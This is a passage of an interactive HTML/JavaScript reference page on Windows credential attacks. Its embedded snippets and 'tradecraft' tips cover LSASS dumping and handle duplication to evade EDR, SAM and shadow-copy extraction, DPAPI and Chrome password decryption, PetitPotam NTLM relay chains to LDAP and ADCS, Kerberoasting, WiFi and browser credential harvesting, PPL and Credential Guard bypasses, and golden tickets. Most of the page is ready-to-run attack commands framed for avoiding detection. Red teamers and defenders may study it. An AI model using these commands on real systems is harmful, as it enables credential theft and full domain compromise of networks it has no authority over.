sekurlsa::logonpasswords\n# Or: pypykatz lsa minidump out.dmp"},
{t:"HandleDuplication technique",l:"c",c:"// Duplicate existing LSASS handle from another process\n// Avoids: directly opening LSASS (monitored by EDR)\n\n// Step 1: Find process with existing handle to LSASS\n// csrss.exe, services.exe often hold LSASS handles\n// Use NtQuerySystemInformation(SystemHandleInformation)\n// to enumerate all handles system-wide\n\n// Step 2: Open the handle-holder process\nHANDLE hHolder = OpenProcess(\n    PROCESS_DUP_HANDLE, FALSE, holderPid);\n\n// Step 3: Duplicate the LSASS handle into our process\nHANDLE hLsass;\nDuplicateHandle(hHolder, remoteLsassHandle,\n    GetCurrentProcess(), &hLsass,\n    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,\n    FALSE, 0);\n\n// Step 4: Use duplicated handle for MiniDumpWriteDump\n// Or: NtReadVirtualMemory with hLsass\n\n// Advantage:\n// - Never call OpenProcess on LSASS directly\n// - EDR Sysmon Event 10 may not fire\n// - Handle source (csrss) is trusted"}
];
C.sam=[
{t:"SAM extraction and offline parsing",l:"bash",c:"# Method 1: reg save (requires admin/SYSTEM)\nreg save HKLM\\SAM C:\\temp\\sam.bak\nreg save HKLM\\SYSTEM C:\\temp\\system.bak\nreg save HKLM\\SECURITY C:\\temp\\security.bak\n\n# Method 2: Volume Shadow Copy (bypasses locks)\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam.bak\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.bak\nvssadmin delete shadows /shadow={GUID} /quiet\n\n# Offline parsing:\n# Impacket secretsdump (local mode):\nsecretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL\n\n# Output:\n# Administrator:500:aad3b...:::  (NT hash)\n# Use for: Pass-the-Hash, offline cracking\n\n# Hashcat NT hash:\nhashcat -m 1000 hashes.txt wordlist.txt\n\n# Remote DCSync (Domain Admin required):\nsecretsdump.py DOMAIN/admin:password@DC_IP\n# Dumps: all domain hashes, LSA secrets, etc."}
];
C.dpa=[
{t:"DPAPI masterkey decrypt + Chrome passwords",l:"bash",c:"# Step 1: Find user master keys\ndir /a %APPDATA%\\Microsoft\\Protect\\<SID>\\\n# Files named with GUIDs = master keys\n\n# Step 2: Decrypt master key (if you have user password)\nmimikatz dpapi::masterkey /in:<masterkey_file> /sid:<SID> /password:<password>\n\n# Or: mimikatz cached master keys from LSASS\nmimikatz sekurlsa::dpapi\n# Shows recently-used master keys in cleartext\n\n# Step 3: Chrome password decryption\n# Get encrypted_key from:\n# %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State\n# JSON: os_crypt.encrypted_key (base64)\n\n# Decrypt key (DPAPI blob):\nmimikatz dpapi::chrome /in:\"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n\n# SharpDPAPI (C#):\nSharpDPAPI.exe triage\n# Auto-discovers and decrypts: credentials, vaults, Chrome\n\n# Domain backup key (DA required):\nmimikatz lsadump::backupkeys /system:DC_FQDN /export\n# Now decrypt ANY user masterkey:\nmimikatz dpapi::masterkey /in:<file> /pvk:backup.pvk"}
];
C.ntl=[
{t:"PetitPotam + ntlmrelayx to LDAP (RBCD)",l:"bash",c:"# Full chain: coerce DC -> relay to LDAP -> RBCD\n\n# Step 1: Start ntlmrelayx targeting LDAP\nntlmrelayx.py -t ldap://DC_IP --delegate-access \\\n    --escalate-user YOURCOMPUTER$\n# Creates: YOURCOMPUTER$ allowed to delegate\n\n# Step 2: Coerce DC authentication (PetitPotam)\npython3 PetitPotam.py ATTACKER_IP DC_IP\n# DC authenticates to our relay\n\n# Step 3: ntlmrelayx relays to LDAP\n# Sets: msDS-AllowedToActOnBehalfOfOtherIdentity\n# on the DC computer object\n\n# Step 4: S4U2Self + S4U2Proxy\ngetST.py -spn cifs/DC_FQDN DOMAIN/YOURCOMPUTER$ \\\n    -impersonate Administrator -dc-ip DC_IP\n\n# Step 5: Use ticket\nexport KRB5CCNAME=Administrator.ccache\nsecretsdump.py -k -no-pass DC_FQDN\n# Full domain hash dump\n\n# Alternative relay target: ADCS (ESC8)\nntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \\\n    --adcs --template Machine\n# Gets certificate -> PKINIT -> TGT"}
];
C.krb=[
{t:"Kerberoast + AS-REP roast",l:"bash",c:"# Kerberoasting (any domain user)\n# Impacket:\nGetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request\n# Output: $krb5tgs$23$*... hashes\n\n# Rubeus (on target):\nRubeus.exe kerberoast /outfile:hashes.txt\n# /rc4opsec: only request RC4 tickets (faster to crack)\n# /aes: request AES tickets (slower to crack but stealthier)\n\n# Crack:\nhashcat -m 13100 hashes.txt wordlist.txt  # RC4\nhashcat -m 19700 hashes.txt wordlist.txt  # AES\n\n# AS-REP Roasting (no auth needed if you know usernames)\nGetNPUsers.py DOMAIN/ -usersfile users.txt \\\n    -dc-ip DC_IP -format hashcat\n\n# Or with auth:\nRubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n\n# Crack:\nhashcat -m 18200 asrep.txt wordlist.txt\n\n# Targeted: set DONT_REQUIRE_PREAUTH on account you control\n# Then AS-REP roast that account (useful for persistence)"}
];
C.vlt=[
{t:"Credential Manager + WiFi + browser extraction",l:"bash",c:"# Credential Manager:\ncmdkey /list\nvaultcmd /listcreds:\"Windows Credentials\" /all\n\n# Use saved creds:\nrunas /savecred /user:DOMAIN\\admin cmd.exe\n\n# WiFi passwords (admin):\nnetsh wlan show profiles\nnetsh wlan show profile name=\"CorpWifi\" key=clear\n# Key Content = plaintext password\n\n# All WiFi passwords at once:\nfor /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| find \"Profile\"') do @netsh wlan show profile name=%a key=clear 2>nul | find \"Key Content\"\n\n# Browser passwords:\n# SharpChromium (C#, in-memory):\nSharpChromium.exe logins\nSharpChromium.exe cookies\n\n# HackBrowserData (Go, multi-browser):\nhack-browser-data.exe -b chrome\n\n# LaZagne (Python, multi-source):\nlaZagne.exe all\n\n# Manual Chrome (Python):\n# 1. Copy Login Data + Local State\n# 2. Extract encrypted_key from Local State JSON\n# 3. DPAPI decrypt key\n# 4. AES-GCM decrypt each password_value"}
];
C.kit=[
{t:"Complete credential attack workflow",l:"bash",c:"# === NO CREDS ===\n# Responder: LLMNR/NBNS poisoning\nresponder -I eth0 -wrf\n# Captures NTLMv2 hashes -> crack offline\nhashcat -m 5600 hashes.txt wordlist.txt\n\n# === DOMAIN USER ===\n# Kerberoast:\nGetUserSPNs.py DOMAIN/user:pass -request\n# AS-REP roast:\nGetNPUsers.py DOMAIN/ -usersfile users.txt\n# NTLM relay (if unsigned targets exist):\nntlmrelayx.py -t ldap://DC --delegate-access\n\n# === LOCAL ADMIN ===\n# LSASS dump:\nnanodump.exe --write out.dmp\n# SAM extract:\nreg save HKLM\\SAM sam && reg save HKLM\\SYSTEM sys\n# DPAPI:\nSharpDPAPI.exe triage\n# Browser creds:\nSharpChromium.exe logins\n\n# === DOMAIN ADMIN ===\n# DCSync (remote, stealthy):\nsecretsdump.py DOMAIN/DA:pass@DC_IP\n# DPAPI backup key:\nmimikatz lsadump::backupkeys /export\n# Golden ticket:\nmimikatz kerberos::golden /user:admin /domain:... /krbtgt:HASH"}
];
C.byp=[
{t:"Bypass RunAsPPL + Credential Guard",l:"bash",c:"# RunAsPPL bypass options:\n\n# 1. PPLFault (exploit PPL implementation)\nPPLFault.exe -dmpcmd nanodump.exe\n# Runs nanodump in PPL context\n\n# 2. mimidrv.sys (kernel driver)\nmimikatz !+\nmimikatz !processprotect /process:lsass.exe /remove\nmimikatz sekurlsa::logonpasswords\n\n# 3. BYOVD (load vulnerable driver)\n# Use RTCore64.sys or similar\n# Read LSASS memory via physical memory IOCTL\n\n# Credential Guard bypass:\n# Credential Guard protects NTLM hashes in VTL1\n# These methods still work:\n\n# DCSync (network-based, doesn't touch LSASS):\nsecretsdump.py DOMAIN/admin:pass@DC\n\n# Kerberos tickets (not in VTL1):\nRubeus.exe dump\n\n# DPAPI (not protected by Credential Guard):\nSharpDPAPI.exe triage\n\n# Cached domain creds (in SECURITY hive, not LSASS):\nsecretsdump.py -security security.bak LOCAL"}
];
return C[s]||[];
}
var TR={
lsa:[
{t:"WDigest is the easiest path to plaintext passwords",d:"Set UseLogonCredential=1, wait for user to re-logon. Plaintext password appears in LSASS. Disabled by default since Win8.1, but the registry key still works on modern systems."},
{t:"Different logon types cache different credentials",d:"Interactive (Type 2): caches everything (hash, TGT, plaintext if WDigest). Network (Type 3): only NTLM hash, no TGT. RDP (Type 10): like interactive. Understanding this determines what you can extract."},
{t:"SSP injection gives future plaintext without touching current creds",d:"Register a custom SSP (mimilib.dll) in LSASS. Every future logon sends plaintext to your log file. Persists until reboot. More subtle than dumping LSASS."},
{t:"LSASS heap contains DPAPI master key cache",d:"Recently used DPAPI master keys are cached in LSASS memory. sekurlsa::dpapi dumps them. This lets you decrypt DPAPI blobs without knowing the user password."}
],
dmp:[
{t:"Nanodump with direct syscalls bypasses most EDR",d:"Nanodump unhooks ntdll, uses direct syscalls, and can write to a named pipe instead of disk. Avoids: usermode hooks, ETW, and file-based detection. Current best practice for LSASS dump."},
{t:"HandleDuplication avoids opening LSASS directly",d:"EDR monitors OpenProcess on LSASS (Sysmon Event 10). Instead: find an existing LSASS handle in csrss.exe, duplicate it into your process. The EDR may not flag handle duplication from a trusted source."},
{t:"comsvcs.dll is a LOLBin but heavily signatured",d:"Every EDR has signatures for 'comsvcs.dll MiniDump'. Renaming the DLL or copying it helps slightly. For real engagements, use nanodump or custom tools instead."},
{t:"MirrorDump writes to pipe, not file",d:"LSASS dump to a named pipe avoids creating a file on disk. The pipe reader can encrypt the dump in-flight. No .dmp file for EDR file scanning to find."}
],
sam:[
{t:"Volume Shadow Copy bypasses locked registry hives",d:"SAM/SYSTEM/SECURITY hives are locked by the OS. VSS creates a snapshot where the files aren't locked. Copy from shadow copy, parse offline. Clean: delete the shadow after."},
{t:"LSA secrets contain service account passwords",d:"The SECURITY hive's LSA secrets store passwords for services configured with stored credentials. Also: computer account password ($MACHINE.ACC) and DPAPI system keys."},
{t:"DCC2 is slow to crack but valuable for DA passwords",d:"Domain cached credentials use 10240 PBKDF2 rounds. Hashcat mode 2100 is very slow. But if a DA has logged in recently, their cached credential is there. Worth the cracking time."},
{t:"secretsdump.py parses everything in one command",d:"secretsdump.py -sam sam -system system -security security LOCAL extracts: NT hashes, LSA secrets, domain cached creds, computer account hash. One tool for all offline registry attacks."}
],
dpa:[
{t:"Domain DPAPI backup key decrypts any user's secrets",d:"One key on the DC can decrypt every user's master key across the domain. Extract with DA access: lsadump::backupkeys. This key is rarely rotated. Extremely powerful for post-compromise access."},
{t:"Chrome passwords are DPAPI + AES-GCM",d:"The decryption chain: Local State JSON → base64 encrypted_key → DPAPI decrypt → AES-256-GCM key → decrypt each password_value from Login Data SQLite. Understanding the chain lets you build custom tools."},
{t:"LSASS caches recently used master keys",d:"sekurlsa::dpapi dumps master keys from LSASS memory. If the user has recently accessed DPAPI-protected data, their master key is cached. No password needed to decrypt their secrets."},
{t:"Machine DPAPI scope uses DPAPI_SYSTEM from LSA secrets",d:"WiFi passwords and system-level DPAPI blobs use machine master keys. The encryption key (DPAPI_SYSTEM) is in LSA secrets. Extract SECURITY hive → get DPAPI_SYSTEM → decrypt machine-scope blobs."}
],
ntl:[
{t:"PetitPotam + ADCS ESC8 is instant domain compromise",d:"Coerce DC with PetitPotam, relay to ADCS HTTP enrollment, get DC machine certificate, PKINIT for DC TGT, DCSync. Entire chain: no credentials needed to start, ends with full domain dump."},
{t:"Always check SMB/LDAP signing before relay",d:"SMB signing on target = relay blocked. LDAP signing enforced = relay blocked. crackmapexec smb targets --gen-relay-list gives you the list of relay-able hosts. Don't waste time on signed targets."},
{t:"RBCD via LDAP relay is the most flexible attack",d:"Relay to LDAP and set msDS-AllowedToActOnBehalfOfOtherIdentity. Then S4U2Self/S4U2Proxy to impersonate any user to the target service. Works against any machine account."},
{t:"WebDAV coercion forces HTTP-based NTLM which relays anywhere",d:"WebDAV forces HTTP-based NTLM auth which isn't affected by SMB signing. Trigger via .searchConnector-ms files or WebClient service. Relayable to LDAP, ADCS, or any HTTP service."}
],
krb:[
{t:"RC4 Kerberoast tickets crack 1000x faster than AES",d:"RC4-encrypted TGS tickets: hashcat -m 13100 at billions/sec. AES tickets: hashcat -m 19700 at millions/sec. Request RC4 explicitly with Rubeus /rc4opsec. But: AES-only policies block RC4 requests."},
{t:"Unconstrained delegation + coercion = DC TGT",d:"If you compromise a server with unconstrained delegation: coerce the DC to authenticate to it (PrinterBug, PetitPotam). The DC's TGT is cached. Extract it and use for DCSync."},
{t:"AS-REP roasting works without any credentials",d:"You only need a list of usernames. No password, no domain account. GetNPUsers.py sends AS-REQ for each user. Accounts with DONT_REQUIRE_PREAUTH return crackable hashes."},
{t:"PKINIT certificate auth enables NTLM hash recovery",d:"After PKINIT auth with a stolen cert, use U2U (User-to-User) to request a TGS encrypted with the user's NT hash. Crack the ticket to recover the NTLM hash. certipy does this automatically."}
],
vlt:[
{t:"cmdkey /list shows saved credentials immediately",d:"Quick check on any box: cmdkey /list. If creds are saved: runas /savecred /user:DOMAIN\\admin cmd.exe. No password prompt. Often found on jump boxes and admin workstations."},
{t:"WiFi passwords are in cleartext with netsh",d:"netsh wlan show profile name=X key=clear shows the WPA2 PSK in plaintext. Requires admin but no tools. Corporate WiFi may use EAP/PEAP with domain credentials—even more valuable."},
{t:"Browser passwords require DPAPI understanding",d:"Chrome/Edge use DPAPI to protect the AES key that encrypts passwords. You need either: the user's DPAPI master key (from LSASS or password), or run as the user to call CryptUnprotectData directly."},
{t:"LaZagne finds credentials you didn't know existed",d:"LaZagne searches 25+ software categories: browsers, mail clients, databases, sysadmin tools, WiFi, etc. Run it on every compromised host. Frequently finds credentials to other systems."}
],
kit:[
{t:"Start with no-auth attacks, escalate methodically",d:"No creds → Responder + relay. Domain user → Kerberoast + relay. Local admin → LSASS + SAM + DPAPI. Domain admin → DCSync + backup key. Each level unlocks new attack surface."},
{t:"DCSync is the stealthiest domain hash extraction",d:"DCSync replicates AD data over the network using DRSUAPI. No NTDS.dit copy, no VSS, no touching the DC filesystem. Only generates Event 4662 with specific replication rights GUIDs."},
{t:"Offline attacks don't trigger any alerts",d:"SAM hive parsing, DCC2 cracking, DPAPI blob decryption—all offline. Copy the files, exfil, attack on your own infrastructure. Zero detection opportunity for the defender."},
{t:"DPAPI is the most underutilized credential source",d:"Most operators dump LSASS and stop. DPAPI protects: browser passwords, WiFi, RDP saved creds, scheduled task passwords, EFS keys. SharpDPAPI triage on every host finds additional credentials."}
],
byp:[
{t:"Credential Guard doesn't protect everything",d:"VTL1 only isolates NTLM hashes and Kerberos keys in LSASS. Still works: DCSync, Kerberoast, AS-REP roast, DPAPI, SAM extraction, cached domain creds. Focus on what's NOT protected."},
{t:"PPLFault is the current best PPL bypass",d:"Exploits implementation bugs in the PPL mechanism itself. No kernel driver needed. Works on specific Windows builds. Check compatibility before relying on it."},
{t:"AES-only Kerberos makes Kerberoast impractical",d:"If the domain enforces AES-only, RC4 TGS requests fail and AES tickets are 1000x slower to crack. Pivot to: password spray, relay attacks, or target accounts with weak AES passwords."},
{t:"Protected Users group members can't be Kerberoasted",d:"Members of Protected Users: no NTLM auth, no delegation, no TGT caching beyond 4h. But: rarely applied to service accounts (breaks services). Check group membership before targeting."}
]
};
function render(){
var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
var codes=getCodes(S.s),tricks=TR[S.s]||[];
var flow='';
if(S.s==='lsa')flow=fLSA();else if(S.s==='dmp')flow=fDMP();else if(S.s==='sam')flow=fSAM();
else if(S.s==='dpa')flow=fDPA();else if(S.s==='ntl')flow=fNTL();else if(S.s==='krb')flow=fKRB();
else if(S.s==='vlt')flow=fVLT();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
var thtml=tricks.length===0?'':
'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
$('#app').innerHTML=
'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Credential Attacks &amp; DPAPI Reference</h1><div class="sub">LSASS \u2022 Dump Methods \u2022 SAM \u2022 DPAPI \u2022 NTLM Relay \u2022 Kerberos \u2022 Vault \u2022 Toolkit \u2022 Defenses</div></div></div><div class="st">'+
SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
'<div class="ft">'+[{c:"#f87171",l:"LSASS"},{c:"#60a5fa",l:"Dumps"},{c:"#a78bfa",l:"SAM"},{c:"#fbbf24",l:"DPAPI"},{c:"#34d399",l:"NTLM Relay"},{c:"#f59e0b",l:"Kerberos"},{c:"#e879f9",l:"Vault"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Defenses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
$$('.cp').forEach(function(p){
p.querySelector('.ct2').onclick=function(){
var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
if(ex){ex.remove();cv.classList.remove('op');return}
cv.classList.add('op');
var ci=parseInt(p.dataset.ci),c=codes[ci];
var pre=document.createElement('pre');pre.className='cb mono';
pre.innerHTML=c.c.split('\n').map(function(line){
var ci2=line.indexOf('//');if(ci2<0)ci2=line.indexOf('#');
if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
return esc(line);
}).join('\n');
p.appendChild(pre);};
});
$$('.ti').forEach(function(p){
p.querySelector('.tt').onclick=function(){
var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
p.classList.add('op');cv.classList.add('op');
var ti=parseInt(p.dataset.ti);
var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
p.appendChild(div);};
});
}
render();
</script>
</body>
</html>
